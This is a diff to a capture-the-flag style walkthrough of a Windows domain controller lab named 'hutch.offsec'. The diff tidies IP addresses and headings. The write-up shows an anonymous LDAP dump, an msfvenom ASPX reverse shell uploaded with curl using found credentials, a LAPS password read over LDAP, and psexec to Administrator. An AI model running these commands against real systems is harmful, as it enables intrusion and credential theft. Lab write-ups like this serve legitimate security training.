@@ -24,7 +24,7 @@ categories:
 
 ---
 
-## Recon
+## Enumeration
 
 ### Nmap
 
@@ -36,21 +36,17 @@ PORT     STATE SERVICE       VERSION
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0.)
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec.)
 445/tcp  open  microsoft-ds?
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0.)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec.)
 3269/tcp open  tcpwrapped
 ```
 {{< /collapse >}}
 
 This is a Windows Server 2019 domain controller (`hutch.offsec`).
-
----
-
-## Enumeration
 
 ### Port 80 - IIS + WebDAV
 
@@ -63,7 +59,7 @@ WebDAV upload requires authentication -- can't upload anonymously.
 LDAP allows **anonymous/NULL bind**. We can dump the entire directory:
 
 ```bash
-ldapsearch -x -H ldap://192.168.160.122 -D '' -w '' -b "DC=HUTCH,DC=OFFSEC"
+ldapsearch -x -H ldap://192.168.160.122 -D '' -w '' -b "DC=hutch,DC=offsec"
 ```
 
 Extracted AD users:
@@ -91,13 +87,13 @@ With valid credentials, we can upload an ASPX reverse shell to the IIS web root 
 
 ```bash
 # Generate payload
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.90 LPORT=139 -f aspx > shell.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.160 LPORT=139 -f aspx > shell.aspx
 
 # Upload via curl with creds
-curl -T shell.aspx http://192.168.100.122/ -v -u fmcsorley:CrabSharkJellyfish192
+curl -T shell.aspx http://192.168.160.122/ -v -u fmcsorley:CrabSharkJellyfish192
 
 # Trigger it
-curl http://192.168.100.122/shell.aspx -v
+curl http://192.168.160.122/shell.aspx -v
 ```
 
 {{< callout type="warning" >}}
@@ -123,16 +119,16 @@ LAPS is installed and enabled on the target:
 Since `fmcsorley` can read the LAPS password attribute, query LDAP for the local Administrator password:
 
 ```bash
-ldapsearch -x -H ldap://192.168.116.122 \
+ldapsearch -x -H ldap://192.168.160.122 \
   -D 'CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec' \
   -w 'CrabSharkJellyfish192' \
-  -b "DC=HUTCH,DC=OFFSEC" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+  -b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
 Then use `psexec` with the extracted Administrator password:
 
 ```bash
-psexec.py hutch.offsec/Administrator:'<extracted_password>'@192.168.116.122
+psexec.py hutch.offsec/Administrator:'<extracted_password>'@192.168.160.122
 ```
 
 ![psexec shell](/images/hutch/psexec.png)
